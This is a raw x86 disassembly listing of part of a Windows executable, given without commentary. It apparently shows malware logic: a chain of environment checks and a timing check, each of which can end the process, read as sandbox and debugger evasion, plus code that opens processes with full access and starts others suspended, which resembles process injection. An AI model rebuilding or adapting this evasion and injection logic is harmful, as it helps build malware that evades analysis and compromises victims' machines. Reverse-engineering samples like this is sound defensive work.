  408a2a:	68 00 30 00 00       	push   $0x3000
  408a2f:	68 f4 01 00 00       	push   $0x1f4
  408a34:	6a 00                	push   $0x0
  408a36:	53                   	push   %ebx
  408a37:	e8 1c c2 ff ff       	call   0x404c58
  408a3c:	8b f8                	mov    %eax,%edi
  408a3e:	8d 45 fc             	lea    -0x4(%ebp),%eax
  408a41:	50                   	push   %eax
  408a42:	68 f4 01 00 00       	push   $0x1f4
  408a47:	68 fc 88 40 00       	push   $0x4088fc
  408a4c:	57                   	push   %edi
  408a4d:	53                   	push   %ebx
  408a4e:	e8 2d c2 ff ff       	call   0x404c80
  408a53:	81 7d fc f4 01 00 00 	cmpl   $0x1f4,-0x4(%ebp)
  408a5a:	75 14                	jne    0x408a70
  408a5c:	8d 45 f8             	lea    -0x8(%ebp),%eax
  408a5f:	50                   	push   %eax
  408a60:	6a 00                	push   $0x0
  408a62:	56                   	push   %esi
  408a63:	57                   	push   %edi
  408a64:	6a 00                	push   $0x0
  408a66:	6a 00                	push   $0x0
  408a68:	53                   	push   %ebx
  408a69:	e8 32 c1 ff ff       	call   0x404ba0
  408a6e:	85 c0                	test   %eax,%eax
  408a70:	33 c0                	xor    %eax,%eax
  408a72:	5a                   	pop    %edx
  408a73:	59                   	pop    %ecx
  408a74:	59                   	pop    %ecx
  408a75:	64 89 10             	mov    %edx,%fs:(%eax)
  408a78:	68 92 8a 40 00       	push   $0x408a92
  408a7d:	8d 45 dc             	lea    -0x24(%ebp),%eax
  408a80:	ba 03 00 00 00       	mov    $0x3,%edx
  408a85:	e8 ea ac ff ff       	call   0x403774
  408a8a:	c3                   	ret
  408a8b:	e9 34 a7 ff ff       	jmp    0x4031c4
  408a90:	eb eb                	jmp    0x408a7d
  408a92:	5f                   	pop    %edi
  408a93:	5e                   	pop    %esi
  408a94:	5b                   	pop    %ebx
  408a95:	8b e5                	mov    %ebp,%esp
  408a97:	5d                   	pop    %ebp
  408a98:	c3                   	ret
  408a99:	00 00                	add    %al,(%eax)
  408a9b:	00 44 65 6c          	add    %al,0x6c(%ebp,%eiz,2)
  408a9f:	65 74 65             	gs je  0x408b07
  408aa2:	46                   	inc    %esi
  408aa3:	69 6c 65 41 00 6b 65 	imul   $0x72656b00,0x41(%ebp,%eiz,2),%ebp
  408aaa:	72 
  408aab:	6e                   	outsb  %ds:(%esi),(%dx)
  408aac:	65 6c                	gs insb (%dx),%es:(%edi)
  408aae:	33 32                	xor    (%edx),%esi
  408ab0:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  408ab3:	6c                   	insb   (%dx),%es:(%edi)
  408ab4:	00 00                	add    %al,(%eax)
  408ab6:	00 00                	add    %al,(%eax)
  408ab8:	45                   	inc    %ebp
  408ab9:	78 69                	js     0x408b24
  408abb:	74 54                	je     0x408b11
  408abd:	68 72 65 61 64       	push   $0x64616572
  408ac2:	00 00                	add    %al,(%eax)
  408ac4:	53                   	push   %ebx
  408ac5:	6c                   	insb   (%dx),%es:(%edi)
  408ac6:	65 65 70 00          	gs gs jo 0x408aca
  408aca:	00 00                	add    %al,(%eax)
  408acc:	55                   	push   %ebp
  408acd:	8b ec                	mov    %esp,%ebp
  408acf:	33 c0                	xor    %eax,%eax
  408ad1:	55                   	push   %ebp
  408ad2:	68 f1 8a 40 00       	push   $0x408af1
  408ad7:	64 ff 30             	push   %fs:(%eax)
  408ada:	64 89 20             	mov    %esp,%fs:(%eax)
  408add:	ff 05 80 b9 40 00    	incl   0x40b980
  408ae3:	33 c0                	xor    %eax,%eax
  408ae5:	5a                   	pop    %edx
  408ae6:	59                   	pop    %ecx
  408ae7:	59                   	pop    %ecx
  408ae8:	64 89 10             	mov    %edx,%fs:(%eax)
  408aeb:	68 f8 8a 40 00       	push   $0x408af8
  408af0:	c3                   	ret
  408af1:	e9 ce a6 ff ff       	jmp    0x4031c4
  408af6:	eb f8                	jmp    0x408af0
  408af8:	5d                   	pop    %ebp
  408af9:	c3                   	ret
  408afa:	8b c0                	mov    %eax,%eax
  408afc:	83 2d 80 b9 40 00 01 	subl   $0x1,0x40b980
  408b03:	c3                   	ret
  408b04:	53                   	push   %ebx
  408b05:	a1 d8 a0 40 00       	mov    0x40a0d8,%eax
  408b0a:	80 38 01             	cmpb   $0x1,(%eax)
  408b0d:	75 10                	jne    0x408b1f
  408b0f:	e8 a4 ee ff ff       	call   0x4079b8
  408b14:	3c 01                	cmp    $0x1,%al
  408b16:	75 07                	jne    0x408b1f
  408b18:	6a 00                	push   $0x0
  408b1a:	e8 91 c0 ff ff       	call   0x404bb0
  408b1f:	a1 b4 a0 40 00       	mov    0x40a0b4,%eax
  408b24:	80 38 01             	cmpb   $0x1,(%eax)
  408b27:	75 10                	jne    0x408b39
  408b29:	e8 06 ed ff ff       	call   0x407834
  408b2e:	3c 01                	cmp    $0x1,%al
  408b30:	75 07                	jne    0x408b39
  408b32:	6a 00                	push   $0x0
  408b34:	e8 77 c0 ff ff       	call   0x404bb0
  408b39:	a1 00 a1 40 00       	mov    0x40a100,%eax
  408b3e:	80 38 01             	cmpb   $0x1,(%eax)
  408b41:	75 10                	jne    0x408b53
  408b43:	e8 a8 ec ff ff       	call   0x4077f0
  408b48:	3c 01                	cmp    $0x1,%al
  408b4a:	75 07                	jne    0x408b53
  408b4c:	6a 00                	push   $0x0
  408b4e:	e8 5d c0 ff ff       	call   0x404bb0
  408b53:	a1 b0 a0 40 00       	mov    0x40a0b0,%eax
  408b58:	80 38 01             	cmpb   $0x1,(%eax)
  408b5b:	75 10                	jne    0x408b6d
  408b5d:	e8 36 ed ff ff       	call   0x407898
  408b62:	3c 01                	cmp    $0x1,%al
  408b64:	75 07                	jne    0x408b6d
  408b66:	6a 00                	push   $0x0
  408b68:	e8 43 c0 ff ff       	call   0x404bb0
  408b6d:	a1 f8 a0 40 00       	mov    0x40a0f8,%eax
  408b72:	80 38 01             	cmpb   $0x1,(%eax)
  408b75:	75 10                	jne    0x408b87
  408b77:	e8 60 ee ff ff       	call   0x4079dc
  408b7c:	3c 01                	cmp    $0x1,%al
  408b7e:	75 07                	jne    0x408b87
  408b80:	6a 00                	push   $0x0
  408b82:	e8 29 c0 ff ff       	call   0x404bb0
  408b87:	a1 cc a0 40 00       	mov    0x40a0cc,%eax
  408b8c:	80 38 01             	cmpb   $0x1,(%eax)
  408b8f:	75 10                	jne    0x408ba1
  408b91:	e8 da ef ff ff       	call   0x407b70
  408b96:	3c 01                	cmp    $0x1,%al
  408b98:	75 07                	jne    0x408ba1
  408b9a:	6a 00                	push   $0x0
  408b9c:	e8 0f c0 ff ff       	call   0x404bb0
  408ba1:	a1 d4 a0 40 00       	mov    0x40a0d4,%eax
  408ba6:	80 38 01             	cmpb   $0x1,(%eax)
  408ba9:	75 10                	jne    0x408bbb
  408bab:	e8 08 ef ff ff       	call   0x407ab8
  408bb0:	3c 01                	cmp    $0x1,%al
  408bb2:	75 07                	jne    0x408bbb
  408bb4:	6a 00                	push   $0x0
  408bb6:	e8 f5 bf ff ff       	call   0x404bb0
  408bbb:	a1 c4 a0 40 00       	mov    0x40a0c4,%eax
  408bc0:	80 38 01             	cmpb   $0x1,(%eax)
  408bc3:	75 10                	jne    0x408bd5
  408bc5:	e8 36 ee ff ff       	call   0x407a00
  408bca:	3c 01                	cmp    $0x1,%al
  408bcc:	75 07                	jne    0x408bd5
  408bce:	6a 00                	push   $0x0
  408bd0:	e8 db bf ff ff       	call   0x404bb0
  408bd5:	a1 fc a0 40 00       	mov    0x40a0fc,%eax
  408bda:	80 38 01             	cmpb   $0x1,(%eax)
  408bdd:	75 10                	jne    0x408bef
  408bdf:	e8 44 f0 ff ff       	call   0x407c28
  408be4:	3c 01                	cmp    $0x1,%al
  408be6:	75 07                	jne    0x408bef
  408be8:	6a 00                	push   $0x0
  408bea:	e8 c1 bf ff ff       	call   0x404bb0
  408bef:	a1 c0 a0 40 00       	mov    0x40a0c0,%eax
  408bf4:	80 38 01             	cmpb   $0x1,(%eax)
  408bf7:	75 10                	jne    0x408c09
  408bf9:	e8 5a f3 ff ff       	call   0x407f58
  408bfe:	3c 01                	cmp    $0x1,%al
  408c00:	75 07                	jne    0x408c09
  408c02:	6a 00                	push   $0x0
  408c04:	e8 a7 bf ff ff       	call   0x404bb0
  408c09:	a1 b8 a0 40 00       	mov    0x40a0b8,%eax
  408c0e:	80 38 01             	cmpb   $0x1,(%eax)
  408c11:	75 10                	jne    0x408c23
  408c13:	e8 74 f1 ff ff       	call   0x407d8c
  408c18:	3c 01                	cmp    $0x1,%al
  408c1a:	75 07                	jne    0x408c23
  408c1c:	6a 00                	push   $0x0
  408c1e:	e8 8d bf ff ff       	call   0x404bb0
  408c23:	a1 04 a1 40 00       	mov    0x40a104,%eax
  408c28:	80 38 01             	cmpb   $0x1,(%eax)
  408c2b:	0f 85 3d 01 00 00    	jne    0x408d6e
  408c31:	e8 ca bf ff ff       	call   0x404c00
  408c36:	8b d8                	mov    %eax,%ebx
  408c38:	b8 34 78 40 00       	mov    $0x407834,%eax
  408c3d:	e8 da f1 ff ff       	call   0x407e1c
  408c42:	84 c0                	test   %al,%al
  408c44:	74 07                	je     0x408c4d
  408c46:	6a 00                	push   $0x0
  408c48:	e8 63 bf ff ff       	call   0x404bb0
  408c4d:	b8 98 78 40 00       	mov    $0x407898,%eax
  408c52:	e8 c5 f1 ff ff       	call   0x407e1c
  408c57:	84 c0                	test   %al,%al
  408c59:	74 07                	je     0x408c62
  408c5b:	6a 00                	push   $0x0
  408c5d:	e8 4e bf ff ff       	call   0x404bb0
  408c62:	b8 b8 79 40 00       	mov    $0x4079b8,%eax
  408c67:	e8 b0 f1 ff ff       	call   0x407e1c
  408c6c:	84 c0                	test   %al,%al
  408c6e:	74 07                	je     0x408c77
  408c70:	6a 00                	push   $0x0
  408c72:	e8 39 bf ff ff       	call   0x404bb0
  408c77:	b8 dc 79 40 00       	mov    $0x4079dc,%eax
  408c7c:	e8 9b f1 ff ff       	call   0x407e1c
  408c81:	84 c0                	test   %al,%al
  408c83:	74 07                	je     0x408c8c
  408c85:	6a 00                	push   $0x0
  408c87:	e8 24 bf ff ff       	call   0x404bb0
  408c8c:	b8 00 7a 40 00       	mov    $0x407a00,%eax
  408c91:	e8 86 f1 ff ff       	call   0x407e1c
  408c96:	84 c0                	test   %al,%al
  408c98:	74 07                	je     0x408ca1
  408c9a:	6a 00                	push   $0x0
  408c9c:	e8 0f bf ff ff       	call   0x404bb0
  408ca1:	b8 b8 7a 40 00       	mov    $0x407ab8,%eax
  408ca6:	e8 71 f1 ff ff       	call   0x407e1c
  408cab:	84 c0                	test   %al,%al
  408cad:	74 07                	je     0x408cb6
  408caf:	6a 00                	push   $0x0
  408cb1:	e8 fa be ff ff       	call   0x404bb0
  408cb6:	b8 70 7b 40 00       	mov    $0x407b70,%eax
  408cbb:	e8 5c f1 ff ff       	call   0x407e1c
  408cc0:	84 c0                	test   %al,%al
  408cc2:	74 07                	je     0x408ccb
  408cc4:	6a 00                	push   $0x0
  408cc6:	e8 e5 be ff ff       	call   0x404bb0
  408ccb:	b8 28 7c 40 00       	mov    $0x407c28,%eax
  408cd0:	e8 47 f1 ff ff       	call   0x407e1c
  408cd5:	84 c0                	test   %al,%al
  408cd7:	74 07                	je     0x408ce0
  408cd9:	6a 00                	push   $0x0
  408cdb:	e8 d0 be ff ff       	call   0x404bb0
  408ce0:	b8 a8 7d 40 00       	mov    $0x407da8,%eax
  408ce5:	e8 32 f1 ff ff       	call   0x407e1c
  408cea:	84 c0                	test   %al,%al
  408cec:	74 07                	je     0x408cf5
  408cee:	6a 00                	push   $0x0
  408cf0:	e8 bb be ff ff       	call   0x404bb0
  408cf5:	b8 3c 7e 40 00       	mov    $0x407e3c,%eax
  408cfa:	e8 1d f1 ff ff       	call   0x407e1c
  408cff:	84 c0                	test   %al,%al
  408d01:	74 07                	je     0x408d0a
  408d03:	6a 00                	push   $0x0
  408d05:	e8 a6 be ff ff       	call   0x404bb0
  408d0a:	b8 80 7e 40 00       	mov    $0x407e80,%eax
  408d0f:	e8 08 f1 ff ff       	call   0x407e1c
  408d14:	84 c0                	test   %al,%al
  408d16:	74 07                	je     0x408d1f
  408d18:	6a 00                	push   $0x0
  408d1a:	e8 91 be ff ff       	call   0x404bb0
  408d1f:	b8 58 7f 40 00       	mov    $0x407f58,%eax
  408d24:	e8 f3 f0 ff ff       	call   0x407e1c
  408d29:	84 c0                	test   %al,%al
  408d2b:	74 07                	je     0x408d34
  408d2d:	6a 00                	push   $0x0
  408d2f:	e8 7c be ff ff       	call   0x404bb0
  408d34:	b8 8c 7d 40 00       	mov    $0x407d8c,%eax
  408d39:	e8 de f0 ff ff       	call   0x407e1c
  408d3e:	84 c0                	test   %al,%al
  408d40:	74 07                	je     0x408d49
  408d42:	6a 00                	push   $0x0
  408d44:	e8 67 be ff ff       	call   0x404bb0
  408d49:	b8 f0 77 40 00       	mov    $0x4077f0,%eax
  408d4e:	e8 c9 f0 ff ff       	call   0x407e1c
  408d53:	84 c0                	test   %al,%al
  408d55:	74 07                	je     0x408d5e
  408d57:	6a 00                	push   $0x0
  408d59:	e8 52 be ff ff       	call   0x404bb0
  408d5e:	e8 45 f0 ff ff       	call   0x407da8
  408d63:	3c 01                	cmp    $0x1,%al
  408d65:	75 07                	jne    0x408d6e
  408d67:	6a 00                	push   $0x0
  408d69:	e8 42 be ff ff       	call   0x404bb0
  408d6e:	a1 04 a1 40 00       	mov    0x40a104,%eax
  408d73:	80 38 01             	cmpb   $0x1,(%eax)
  408d76:	75 31                	jne    0x408da9
  408d78:	e8 bf f0 ff ff       	call   0x407e3c
  408d7d:	e8 7e be ff ff       	call   0x404c00
  408d82:	33 d2                	xor    %edx,%edx
  408d84:	52                   	push   %edx
  408d85:	50                   	push   %eax
  408d86:	8b c3                	mov    %ebx,%eax
  408d88:	99                   	cltd
  408d89:	29 04 24             	sub    %eax,(%esp)
  408d8c:	19 54 24 04          	sbb    %edx,0x4(%esp)
  408d90:	58                   	pop    %eax
  408d91:	5a                   	pop    %edx
  408d92:	83 fa 00             	cmp    $0x0,%edx
  408d95:	75 09                	jne    0x408da0
  408d97:	3d 88 13 00 00       	cmp    $0x1388,%eax
  408d9c:	76 0b                	jbe    0x408da9
  408d9e:	eb 02                	jmp    0x408da2
  408da0:	7e 07                	jle    0x408da9
  408da2:	6a 00                	push   $0x0
  408da4:	e8 07 be ff ff       	call   0x404bb0
  408da9:	5b                   	pop    %ebx
  408daa:	c3                   	ret
  408dab:	90                   	nop
  408dac:	55                   	push   %ebp
  408dad:	8b ec                	mov    %esp,%ebp
  408daf:	83 c4 90             	add    $0xffffff90,%esp
  408db2:	53                   	push   %ebx
  408db3:	56                   	push   %esi
  408db4:	33 c0                	xor    %eax,%eax
  408db6:	89 45 90             	mov    %eax,-0x70(%ebp)
  408db9:	89 45 94             	mov    %eax,-0x6c(%ebp)
  408dbc:	89 45 98             	mov    %eax,-0x68(%ebp)
  408dbf:	89 45 9c             	mov    %eax,-0x64(%ebp)
  408dc2:	89 45 a0             	mov    %eax,-0x60(%ebp)
  408dc5:	33 c0                	xor    %eax,%eax
  408dc7:	55                   	push   %ebp
  408dc8:	68 9d 91 40 00       	push   $0x40919d
  408dcd:	64 ff 30             	push   %fs:(%eax)
  408dd0:	64 89 20             	mov    %esp,%fs:(%eax)
  408dd3:	a1 d0 a0 40 00       	mov    0x40a0d0,%eax
  408dd8:	e8 3f ad ff ff       	call   0x403b1c
  408ddd:	8b f0                	mov    %eax,%esi
  408ddf:	a1 14 a1 40 00       	mov    0x40a114,%eax
  408de4:	83 38 02             	cmpl   $0x2,(%eax)
  408de7:	0f 85 fc 01 00 00    	jne    0x408fe9
  408ded:	8d 55 a0             	lea    -0x60(%ebp),%edx
  408df0:	a1 20 a1 40 00       	mov    0x40a120,%eax
  408df5:	8b 00                	mov    (%eax),%eax
  408df7:	e8 e0 e3 ff ff       	call   0x4071dc
  408dfc:	8b 45 a0             	mov    -0x60(%ebp),%eax
  408dff:	ba b4 91 40 00       	mov    $0x4091b4,%edx
  408e04:	e8 07 ac ff ff       	call   0x403a10
  408e09:	0f 85 dc 00 00 00    	jne    0x408eeb
  408e0f:	a1 18 a1 40 00       	mov    0x40a118,%eax
  408e14:	80 38 01             	cmpb   $0x1,(%eax)
  408e17:	75 4b                	jne    0x408e64
  408e19:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  408e1c:	ba 44 00 00 00       	mov    $0x44,%edx
  408e21:	e8 92 be ff ff       	call   0x404cb8
  408e26:	8d 45 e8             	lea    -0x18(%ebp),%eax
  408e29:	ba 10 00 00 00       	mov    $0x10,%edx
  408e2e:	e8 85 be ff ff       	call   0x404cb8
  408e33:	8d 45 e8             	lea    -0x18(%ebp),%eax
  408e36:	50                   	push   %eax
  408e37:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  408e3a:	50                   	push   %eax
  408e3b:	6a 00                	push   $0x0
  408e3d:	6a 00                	push   $0x0
  408e3f:	6a 04                	push   $0x4
  408e41:	6a 00                	push   $0x0
  408e43:	6a 00                	push   $0x0
  408e45:	6a 00                	push   $0x0
  408e47:	68 c4 91 40 00       	push   $0x4091c4
  408e4c:	6a 00                	push   $0x0
  408e4e:	e8 45 bd ff ff       	call   0x404b98
  408e53:	8b 5d e8             	mov    -0x18(%ebp),%ebx
  408e56:	8b d6                	mov    %esi,%edx
  408e58:	8b c3                	mov    %ebx,%eax
  408e5a:	e8 05 c8 ff ff       	call   0x405664
  408e5f:	e9 1a 01 00 00       	jmp    0x408f7e
  408e64:	8d 45 fc             	lea    -0x4(%ebp),%eax
  408e67:	50                   	push   %eax
  408e68:	6a 00                	push   $0x0
  408e6a:	68 d4 91 40 00       	push   $0x4091d4
  408e6f:	e8 2c be ff ff       	call   0x404ca0
  408e74:	50                   	push   %eax
  408e75:	e8 2e be ff ff       	call   0x404ca8
  408e7a:	8b 45 fc             	mov    -0x4(%ebp),%eax
  408e7d:	50                   	push   %eax
  408e7e:	6a 00                	push   $0x0
  408e80:	68 ff 0f 1f 00       	push   $0x1f0fff
  408e85:	e8 96 bd ff ff       	call   0x404c20
  408e8a:	8b d8                	mov    %eax,%ebx
  408e8c:	8b d6                	mov    %esi,%edx
  408e8e:	8b c3                	mov    %ebx,%eax
  408e90:	e8 cf c7 ff ff       	call   0x405664
  408e95:	84 c0                	test   %al,%al
  408e97:	75 4b                	jne    0x408ee4
  408e99:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  408e9c:	ba 44 00 00 00       	mov    $0x44,%edx
  408ea1:	e8 12 be ff ff       	call   0x404cb8
  408ea6:	8d 45 e8             	lea    -0x18(%ebp),%eax
  408ea9:	ba 10 00 00 00       	mov    $0x10,%edx
  408eae:	e8 05 be ff ff       	call   0x404cb8
  408eb3:	8d 45 e8             	lea    -0x18(%ebp),%eax
  408eb6:	50                   	push   %eax
  408eb7:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  408eba:	50                   	push   %eax
  408ebb:	6a 00                	push   $0x0
  408ebd:	6a 00                	push   $0x0
  408ebf:	6a 04                	push   $0x4
  408ec1:	6a 00                	push   $0x0
  408ec3:	6a 00                	push   $0x0
  408ec5:	6a 00                	push   $0x0
  408ec7:	68 c4 91 40 00       	push   $0x4091c4
  408ecc:	6a 00                	push   $0x0
  408ece:	e8 c5 bc ff ff       	call   0x404b98
  408ed3:	8b 5d e8             	mov    -0x18(%ebp),%ebx
  408ed6:	8b d6                	mov    %esi,%edx
  408ed8:	8b c3                	mov    %ebx,%eax
  408eda:	e8 85 c7 ff ff       	call   0x405664
  408edf:	e9 9a 00 00 00       	jmp    0x408f7e
  408ee4:	b0 01                	mov    $0x1,%al
  408ee6:	e9 93 00 00 00       	jmp    0x408f7e
  408eeb:	8d 55 f8             	lea    -0x8(%ebp),%edx
  408eee:	a1 20 a1 40 00       	mov    0x40a120,%eax
  408ef3:	8b 00                	mov    (%eax),%eax
  408ef5:	e8 22 dc ff ff       	call   0x406b1c
  408efa:	3c 01                	cmp    $0x1,%al
  408efc:	75 1a                	jne    0x408f18
  408efe:	8d 55 9c             	lea    -0x64(%ebp),%edx
  408f01:	8b 45 f8             	mov    -0x8(%ebp),%eax
  408f04:	e8 33 db ff ff       	call   0x406a3c
  408f09:	8b 55 9c             	mov    -0x64(%ebp),%edx
  408f0c:	a1 20 a1 40 00       	mov    0x40a120,%eax
  408f11:	e8 8e a8 ff ff       	call   0x4037a4
  408f16:	eb 15                	jmp    0x408f2d
  408f18:	8d 45 98             	lea    -0x68(%ebp),%eax
  408f1b:	e8 b4 d9 ff ff       	call   0x4068d4
  408f20:	8b 55 98             	mov    -0x68(%ebp),%edx
  408f23:	a1 20 a1 40 00       	mov    0x40a120,%eax
  408f28:	e8 77 a8 ff ff       	call   0x4037a4
  408f2d:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  408f30:	ba 44 00 00 00       	mov    $0x44,%edx
  408f35:	e8 7e bd ff ff       	call   0x404cb8
  408f3a:	8d 45 e8             	lea    -0x18(%ebp),%eax
  408f3d:	ba 10 00 00 00       	mov    $0x10,%edx
  408f42:	e8 71 bd ff ff       	call   0x404cb8
  408f47:	8d 45 e8             	lea    -0x18(%ebp),%eax
  408f4a:	50                   	push   %eax
  408f4b:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  408f4e:	50                   	push   %eax
  408f4f:	6a 00                	push   $0x0
  408f51:	6a 00                	push   $0x0
  408f53:	6a 04                	push   $0x4
  408f55:	6a 00                	push   $0x0
  408f57:	6a 00                	push   $0x0
  408f59:	6a 00                	push   $0x0
  408f5b:	68 e4 91 40 00       	push   $0x4091e4
  408f60:	a1 20 a1 40 00       	mov    0x40a120,%eax
  408f65:	8b 00                	mov    (%eax),%eax
  408f67:	e8 58 ab ff ff       	call   0x403ac4
  408f6c:	50                   	push   %eax
  408f6d:	e8 26 bc ff ff       	call   0x404b98
  408f72:	8b 5d e8             	mov    -0x18(%ebp),%ebx
  408f75:	8b d6                	mov    %esi,%edx
  408f77:	8b c3                	mov    %ebx,%eax
  408f79:	e8 e6 c6 ff ff       	call   0x405664
  408f7e:	84 c0                	test   %al,%al
  408f80:	0f 85 9d 01 00 00    	jne    0x409123
  408f86:	8b 15 20 a1 40 00    	mov    0x40a120,%edx
  408f8c:	33 c0                	xor    %eax,%eax
  408f8e:	e8 51 9b ff ff       	call   0x402ae4
  408f93:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  408f96:	ba 44 00 00 00       	mov    $0x44,%edx
  408f9b:	e8 18 bd ff ff       	call   0x404cb8
  408fa0:	8d 45 e8             	lea    -0x18(%ebp),%eax
  408fa3:	ba 10 00 00 00       	mov    $0x10,%edx
  408fa8:	e8 0b bd ff ff       	call   0x404cb8
  408fad:	8d 45 e8             	lea    -0x18(%ebp),%eax
  408fb0:	50                   	push   %eax
  408fb1:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  408fb4:	50                   	push   %eax
  408fb5:	6a 00                	push   $0x0
  408fb7:	6a 00                	push   $0x0
  408fb9:	6a 04                	push   $0x4
  408fbb:	6a 00                	push   $0x0
  408fbd:	6a 00                	push   $0x0
  408fbf:	6a 00                	push   $0x0
  408fc1:	68 e4 91 40 00       	push   $0x4091e4
  408fc6:	a1 20 a1 40 00       	mov    0x40a120,%eax
  408fcb:	8b 00                	mov    (%eax),%eax
  408fcd:	e8 f2 aa ff ff       	call   0x403ac4
  408fd2:	50                   	push   %eax
  408fd3:	e8 c0 bb ff ff       	call   0x404b98
  408fd8:	8b 5d e8             	mov    -0x18(%ebp),%ebx
  408fdb:	8b d6                	mov    %esi,%edx
  408fdd:	8b c3                	mov    %ebx,%eax
  408fdf:	e8 80 c6 ff ff       	call   0x405664
  408fe4:	e9 3a 01 00 00       	jmp    0x409123
  408fe9:	a1 14 a1 40 00       	mov    0x40a114,%eax
  408fee:	83 38 01             	cmpl   $0x1,(%eax)
  408ff1:	0f 85 ce 00 00 00    	jne    0x4090c5
  408ff7:	8d 45 94             	lea    -0x6c(%ebp),%eax
  408ffa:	e8 d5 d8 ff ff       	call   0x4068d4
  408fff:	8b 55 94             	mov    -0x6c(%ebp),%edx
  409002:	a1 20 a1 40 00       	mov    0x40a120,%eax
  409007:	e8 98 a7 ff ff       	call   0x4037a4
  40900c:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  40900f:	ba 44 00 00 00       	mov    $0x44,%edx
  409014:	e8 9f bc ff ff       	call   0x404cb8
  409019:	8d 45 e8             	lea    -0x18(%ebp),%eax
  40901c:	ba 10 00 00 00       	mov    $0x10,%edx
  409021:	e8 92 bc ff ff       	call   0x404cb8
  409026:	8d 45 e8             	lea    -0x18(%ebp),%eax
  409029:	50                   	push   %eax
  40902a:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  40902d:	50                   	push   %eax
  40902e:	6a 00                	push   $0x0
  409030:	6a 00                	push   $0x0
  409032:	6a 04                	push   $0x4
  409034:	6a 00                	push   $0x0
  409036:	6a 00                	push   $0x0
  409038:	6a 00                	push   $0x0
  40903a:	68 e4 91 40 00       	push   $0x4091e4
  40903f:	a1 20 a1 40 00       	mov    0x40a120,%eax
  409044:	8b 00                	mov    (%eax),%eax
  409046:	e8 79 aa ff ff       	call   0x403ac4
  40904b:	50                   	push   %eax
  40904c:	e8 47 bb ff ff       	call   0x404b98
  409051:	8b 5d e8             	mov    -0x18(%ebp),%ebx
  409054:	8b d6                	mov    %esi,%edx
  409056:	8b c3                	mov    %ebx,%eax
  409058:	e8 07 c6 ff ff       	call   0x405664
  40905d:	84 c0                	test   %al,%al
  40905f:	0f 85 be 00 00 00    	jne    0x409123
  409065:	8b 15 20 a1 40 00    	mov    0x40a120,%edx
  40906b:	33 c0                	xor    %eax,%eax
  40906d:	e8 72 9a ff ff       	call   0x402ae4
  409072:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  409075:	ba 44 00 00 00       	mov    $0x44,%edx
  40907a:	e8 39 bc ff ff       	call   0x404cb8
  40907f:	8d 45 e8             	lea    -0x18(%ebp),%eax
  409082:	ba 10 00 00 00       	mov    $0x10,%edx
  409087:	e8 2c bc ff ff       	call   0x404cb8
  40908c:	8d 45 e8             	lea    -0x18(%ebp),%eax
  40908f:	50                   	push   %eax
  409090:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  409093:	50                   	push   %eax
  409094:	6a 00                	push   $0x0
  409096:	6a 00                	push   $0x0
  409098:	6a 04                	push   $0x4
  40909a:	6a 00                	push   $0x0
  40909c:	6a 00                	push   $0x0
  40909e:	6a 00                	push   $0x0
  4090a0:	68 e4 91 40 00       	push   $0x4091e4
  4090a5:	a1 20 a1 40 00       	mov    0x40a120,%eax
  4090aa:	8b 00                	mov    (%eax),%eax
  4090ac:	e8 13 aa ff ff       	call   0x403ac4
  4090b1:	50                   	push   %eax
  4090b2:	e8 e1 ba ff ff       	call   0x404b98
  4090b7:	8b 5d e8             	mov    -0x18(%ebp),%ebx
  4090ba:	8b d6                	mov    %esi,%edx
  4090bc:	8b c3                	mov    %ebx,%eax
  4090be:	e8 a1 c5 ff ff       	call   0x405664
  4090c3:	eb 5e                	jmp    0x409123
  4090c5:	8b 15 20 a1 40 00    	mov    0x40a120,%edx
  4090cb:	33 c0                	xor    %eax,%eax
  4090cd:	e8 12 9a ff ff       	call   0x402ae4
  4090d2:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  4090d5:	ba 44 00 00 00       	mov    $0x44,%edx
  4090da:	e8 d9 bb ff ff       	call   0x404cb8
  4090df:	8d 45 e8             	lea    -0x18(%ebp),%eax
  4090e2:	ba 10 00 00 00       	mov    $0x10,%edx
  4090e7:	e8 cc bb ff ff       	call   0x404cb8
  4090ec:	8d 45 e8             	lea    -0x18(%ebp),%eax
  4090ef:	50                   	push   %eax
  4090f0:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  4090f3:	50                   	push   %eax
  4090f4:	6a 00                	push   $0x0
  4090f6:	6a 00                	push   $0x0
  4090f8:	6a 04                	push   $0x4
  4090fa:	6a 00                	push   $0x0
  4090fc:	6a 00                	push   $0x0
  4090fe:	6a 00                	push   $0x0
  409100:	68 e4 91 40 00       	push   $0x4091e4
  409105:	a1 20 a1 40 00       	mov    0x40a120,%eax
  40910a:	8b 00                	mov    (%eax),%eax
  40910c:	e8 b3 a9 ff ff       	call   0x403ac4
  409111:	50                   	push   %eax
  409112:	e8 81 ba ff ff       	call   0x404b98
  409117:	8b 5d e8             	mov    -0x18(%ebp),%ebx
  40911a:	8b d6                	mov    %esi,%edx
  40911c:	8b c3                	mov    %ebx,%eax
  40911e:	e8 41 c5 ff ff       	call   0x405664
  409123:	68 e8 03 00 00       	push   $0x3e8
  409128:	e8 1b bb ff ff       	call   0x404c48
  40912d:	a1 bc a0 40 00       	mov    0x40a0bc,%eax
  409132:	80 38 01             	cmpb   $0x1,(%eax)
  409135:	75 4b                	jne    0x409182
  409137:	8d 55 90             	lea    -0x70(%ebp),%edx
  40913a:	33 c0                	xor    %eax,%eax
  40913c:	e8 a3 99 ff ff       	call   0x402ae4
  409141:	8b 55 90             	mov    -0x70(%ebp),%edx
  409144:	a1 84 b9 40 00       	mov    0x40b984,%eax
  409149:	e8 c2 a8 ff ff       	call   0x403a10
  40914e:	74 32                	je     0x409182
  409150:	68 e4 91 40 00       	push   $0x4091e4
  409155:	68 e4 91 40 00       	push   $0x4091e4
  40915a:	6a 00                	push   $0x0
  40915c:	a1 84 b9 40 00       	mov    0x40b984,%eax
  409161:	e8 5e a9 ff ff       	call   0x403ac4
  409166:	8b c8                	mov    %eax,%ecx
  409168:	ba e8 91 40 00       	mov    $0x4091e8,%edx
  40916d:	33 c0                	xor    %eax,%eax
